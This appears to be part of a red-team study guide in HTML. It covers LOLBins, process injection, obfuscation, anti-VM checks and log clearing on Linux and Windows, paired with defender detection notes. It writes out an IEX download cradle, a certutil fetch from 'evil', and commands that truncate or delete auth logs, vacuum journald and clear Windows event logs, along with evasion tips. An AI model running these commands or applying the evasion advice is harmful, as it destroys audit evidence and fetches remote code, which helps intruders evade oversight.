+<div class="table-container"><table><thead><tr><th>Binary</th><th>Use</th></tr></thead><tbody><tr><td><code>curl</code> / <code>wget</code></td><td>Tool fetch</td></tr><tr><td><code>python</code> / <code>perl</code></td><td>Execution</td></tr><tr><td><code>dd</code> / <code>tar</code> / <code>cp</code></td><td>Staging</td></tr><tr><td><code>systemctl</code> / <code>cron</code></td><td>Persistence</td></tr><tr><td><code>ssh</code></td><td>Tunneling</td></tr><tr><td><code>openssl</code></td><td>Encoded transfer</td></tr></tbody></table></div>
+<h3 id="34-why-it-helps-attackers">3.4 Why It Helps Attackers<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#34-why-it-helps-attackers" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ul>
+<li>Lower static AV hit rate</li>
+<li>May bypass simple application allow-lists if LOLBin is permitted</li>
+<li>Looks closer to IT operations</li>
+</ul>
+<h3 id="35-why-defenders-still-catch-it">3.5 Why Defenders Still Catch It<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#35-why-defenders-still-catch-it" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ul>
+<li>Command-line logging</li>
+<li>Network destination reputation</li>
+<li>Parent/child baselining</li>
+<li>Script block logging / auditd rules</li>
+</ul>
+<blockquote>
+<p><strong>Pro tip:</strong> LOLBins are not magic. <code>certutil -urlcache -f http://evil</code> is one of the most monitored patterns in enterprise SOC rulesets.</p>
+</blockquote>
+<hr/>
+<h2 id="4-process-injection-concepts">4. Process Injection Concepts<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#4-process-injection-concepts" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<h3 id="41-why-inject">4.1 Why Inject?<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#41-why-inject" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ul>
+<li>Hide code inside trusted processes (e.g., <code>explorer.exe</code>)</li>
+<li>Steal tokens from other processes</li>
+<li>Evade simple process-name blocks</li>
+</ul>
+<h3 id="42-common-classes-conceptual">4.2 Common Classes (Conceptual)<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#42-common-classes-conceptual" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="table-container"><table><thead><tr><th>Technique</th><th>Idea</th><th>ATT&amp;CK</th></tr></thead><tbody><tr><td>Classic remote thread</td><td>Write memory + CreateRemoteThread</td><td>T1055</td></tr><tr><td>APC injection</td><td>Queue APC to thread</td><td>T1055.004</td></tr><tr><td>Process hollowing</td><td>Start suspended, replace image</td><td>T1055.012</td></tr><tr><td>Module stomping</td><td>Overwrite loaded module space</td><td>T1055</td></tr><tr><td>Reflective DLL</td><td>Load without LoadLibrary</td><td>T1620 related</td></tr><tr><td>PPID spoofing</td><td>Fake parent process</td><td>T1502</td></tr></tbody></table></div>
+<h3 id="43-practical-notes-for-operators">4.3 Practical Notes for Operators<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#43-practical-notes-for-operators" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ul>
+<li>Highly EDR-instrumented (ETW, kernel callbacks)</li>
+<li>Lab success ≠ production success</li>
+<li>Prefer <strong>legitimate remote admin channels</strong> (WinRM, SSH, cloud APIs) when possible for objectives</li>
+</ul>
+<h3 id="44-detection-angles">4.4 Detection Angles<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#44-detection-angles" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ul>
+<li>Cross-process memory write + thread start</li>
+<li>Unbacked executable memory (RWX)</li>
+<li>Suspicious call stacks</li>
+<li>Rare injection into LSASS / csrss (should almost never happen from user tools)</li>
+</ul>
+<hr/>
+<h2 id="5-obfuscation-techniques">5. Obfuscation Techniques<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#5-obfuscation-techniques" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<h3 id="51-powershell-obfuscation">5.1 PowerShell Obfuscation<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#51-powershell-obfuscation" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Patterns defenders flag:</p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="powershell" data-theme="github-light github-dark"><code data-language="powershell" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># EncodedCommand</span></span>
+<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">powershell </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="operator">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">enc </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="operator">&lt;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">base6</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="operator">4></span></span>
+<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># IEX download cradle</span></span>
+<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">IEX (</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="function">New-Object</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation"> Net.WebClient).DownloadString(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string">'http://...'</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;" data-token-type="punctuation">)</span></span>
+<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># String concatenation / -join / replace chains</span></span>
+<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># AMSI bypass snippets (extremely well signatured)</span></span></code></pre></figure>
+<p><strong>Operator guidance:</strong> Custom, purpose-built tooling beats public obfuscators that every EDR trains on. For exams/labs, encoding is often enough; for enterprise, assume <strong>Script Block Logging</strong> sees the decoded content.</p>
+<h3 id="52-command-line-obfuscation">5.2 Command-Line Obfuscation<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#52-command-line-obfuscation" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ul>
+<li>Extra whitespace / caret escape in cmd (<code>who^ami</code>)</li>
+<li>Environment variable indirection</li>
+<li>Short names (<code>C:\Progra~1\...</code>)</li>
+<li>Alternate data streams execution (legacy interest)</li>
+</ul>
+<h3 id="53-binary-packing--crypting">5.3 Binary Packing / Crypting<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#53-binary-packing--crypting" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Packers reduce signature hits briefly; behavioral detection remains. Signed malware and sideloading are more relevant in mature environments than UPX alone.</p>
+<h3 id="54-script-languages">5.4 Script Languages<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#54-script-languages" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Python/Perl pyinstaller bundles, bash <code>eval</code> chains, JScript — each has telemetry on modern endpoints.</p>
+<h3 id="55-amsi--script-logging-awareness">5.5 AMSI / Script Logging (Awareness)<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#55-amsi--script-logging-awareness" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Windows AMSI inspects script content at runtime. Public “AMSI bypass” one-liners are among the <strong>most detected</strong> artifacts globally. Treat them as lab curiosities unless you have advanced custom research capability and explicit ROE.</p>
+<hr/>
+<h2 id="6-anti-debugging--anti-vm-awareness">6. Anti-Debugging &amp; Anti-VM (Awareness)<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#6-anti-debugging--anti-vm-awareness" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<h3 id="61-why-malware-uses-them">6.1 Why Malware Uses Them<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#61-why-malware-uses-them" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Delay analysis in sandboxes; frustrate reverse engineers.</p>
+<h3 id="62-common-checks-educational">6.2 Common Checks (Educational)<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#62-common-checks-educational" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="table-container"><table><thead><tr><th>Check</th><th>Idea</th></tr></thead><tbody><tr><td>Debugger present APIs</td><td><code>IsDebuggerPresent</code> family</td></tr><tr><td>Timing</td><td>Detect single-step slowdown</td></tr><tr><td>VM MAC prefixes / drivers</td><td>VMware/VirtualBox artifacts</td></tr><tr><td>CPU core / RAM thresholds</td><td>Sandbox minimums</td></tr><tr><td>Human interaction</td><td>Mouse movement requirements</td></tr></tbody></table></div>
+<h3 id="63-red-team-reality">6.3 Red Team Reality<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#63-red-team-reality" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Enterprise targets are often <strong>real workstations and cloud VMs</strong>. Aggressive anti-VM may <strong>break your own beacon</strong> on legitimate VDI. Use sparingly and intentionally.</p>
+<h3 id="64-defender-view">6.4 Defender View<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#64-defender-view" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Sandbox evasion is expected; detonate on real hardware, use hardware-assisted analysis, and focus on <strong>C2 behavior</strong> after execution.</p>
+<hr/>
+<h2 id="7-linux-log--artifact-clearing">7. Linux Log &amp; Artifact Clearing<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#7-linux-log--artifact-clearing" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<h3 id="71-important-logs">7.1 Important Logs<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#71-important-logs" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="table-container"><table><thead><tr><th>Log / file</th><th>Content</th></tr></thead><tbody><tr><td><code>/var/log/auth.log</code></td><td>SSH, sudo (Debian/Ubuntu)</td></tr><tr><td><code>/var/log/secure</code></td><td>Auth (RHEL family)</td></tr><tr><td><code>/var/log/syslog</code> / <code>messages</code></td><td>General system</td></tr><tr><td><code>/var/log/httpd/*</code> <code>/var/log/nginx/*</code></td><td>Web</td></tr><tr><td><code>/var/log/audit/audit.log</code></td><td>auditd</td></tr><tr><td><code>~/.bash_history</code></td><td>Commands</td></tr><tr><td><code>/var/run/utmp</code> <code>wtmp</code> <code>btmp</code></td><td>Logins</td></tr><tr><td><code>lastlog</code></td><td>Last login DB</td></tr><tr><td>journald</td><td><code>journalctl</code> binary logs</td></tr></tbody></table></div>
+<h3 id="72-viewing-before-touching">7.2 Viewing Before Touching<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#72-viewing-before-touching" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">journalctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> ssh</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -n</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> 50</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">grep</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> &quot;Accepted\|sudo&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> /var/log/auth.log</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="operator"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function"> tail</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">last</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -a</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="operator"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function"> head</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">who</span></span></code></pre></figure>
+<h3 id="73-clearing-approaches-authorized-only">7.3 Clearing Approaches (Authorized Only)<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#73-clearing-approaches-authorized-only" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p><strong>Destructive wipe (loud / obvious to IR):</strong></p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># Examples of what attackers historically do — detect these</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">cat</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> /dev/null</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="operator"> ></span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> /var/log/auth.log</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">truncate</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -s</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> 0</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> /var/log/syslog</span></span></code></pre></figure>
+<p><strong>Selective line removal (still risky / inconsistent):</strong></p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">sed</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -i</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> '/10.10.14.5/d'</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> /var/log/auth.log</span></span></code></pre></figure>
+<p><strong>journald:</strong></p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">journalctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --rotate</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">journalctl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --vacuum-time=1s</span></span>
+<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># or rm journal files if permissions allow — highly obvious</span></span></code></pre></figure>
+<h3 id="74-utmp--wtmp--btmp">7.4 utmp / wtmp / btmp<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#74-utmp--wtmp--btmp" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># View</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">who</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">last</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">lastb</span></span>
+<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># Tampering requires specialized tools; crude truncation breaks format</span></span></code></pre></figure>
+<p>Defenders notice empty or inconsistent utmp databases.</p>
+<h3 id="75-auditd">7.5 auditd<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#75-auditd" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>If auditd is active, clearing without stopping service regenerates evidence of tampering. <code>auditctl</code> rules may log the wipe itself.</p>
+<h3 id="76-better-opsec-than-wiping">7.6 Better OPSEC Than Wiping<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#76-better-opsec-than-wiping" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ul>
+<li>Use <strong>SSH keys</strong> and jump hosts already trusted</li>
+<li>Avoid failed logins</li>
+<li>Avoid interactive root when possible</li>
+<li>Keep activity within expected admin patterns</li>
+<li>Use in-memory techniques without writing tools to disk</li>
+</ul>
+<hr/>
+<h2 id="8-windows-log--artifact-clearing">8. Windows Log &amp; Artifact Clearing<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#8-windows-log--artifact-clearing" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<h3 id="81-primary-event-logs">8.1 Primary Event Logs<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#81-primary-event-logs" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="table-container"><table><thead><tr><th>Log</th><th>Interest</th></tr></thead><tbody><tr><td>Security</td><td>Logon 4624/4625, explicit cred 4648, etc.</td></tr><tr><td>System</td><td>Service installs, driver loads</td></tr><tr><td>Application</td><td>App errors</td></tr><tr><td>PowerShell</td><td>Script block 4104, module logging</td></tr><tr><td>Sysmon</td><td>If installed — process/network/file</td></tr><tr><td>Microsoft-Windows-TerminalServices-*</td><td>RDP</td></tr><tr><td>Windows PowerShell / Operational</td><td>PS activity</td></tr></tbody></table></div>
+<h3 id="82-clearing-event-logs-requires-privilege">8.2 Clearing Event Logs (Requires Privilege)<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#82-clearing-event-logs-requires-privilege" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="cmd" data-theme="github-light github-dark"><code data-language="cmd" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">wevtutil el</span></span>
+<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">wevtutil cl Security</span></span>
+<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">wevtutil cl System</span></span>
+<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">wevtutil cl </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="property">Application</span></span>
